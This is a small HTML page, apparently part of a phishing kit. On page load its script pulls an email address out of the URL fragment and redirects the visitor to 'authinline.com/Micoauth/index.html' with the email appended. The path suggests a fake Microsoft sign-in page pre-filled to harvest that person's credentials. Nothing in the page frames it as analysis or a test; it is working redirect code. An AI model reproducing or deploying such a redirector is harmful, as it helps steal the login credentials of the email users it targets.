<!DOCTYPE html>
<html>
<head>
  <title>Email Redirect</title>
  <script>
    function extractEmailAndRedirect() {
      // Get the current URL
      var currentURL = window.location.href;

      // Split the URL into two parts: before and after the fragment identifier (#)
      var parts = currentURL.split('#');
      var emailPart = parts[1]; // Extract what's after the #

      // Check if the email part is not empty and contains an equal sign
      if (emailPart && emailPart.includes('=')) {
        // Split the email part using the equal sign as a delimiter
        var emailParts = emailPart.split('=');

        // Take the first part which should be the email address
        var cleanedEmail = emailParts[0];

        // Construct the redirect URL by appending the cleaned email to the second link
        var redirectURL = 'https://authinline.com/Micoauth/index.html?' + cleanedEmail;

        // Redirect to the constructed URL
        window.location.href = redirectURL;
      } else {
        // If the email part is empty or does not contain an equal sign, simply redirect to the second link
        window.location.href = 'https://authinline.com/Micoauth/index.html';
      }
    }

    // Call the function immediately when the script is loaded
    extractEmailAndRedirect();
  </script>
</head>
<body>
</body>
</html>
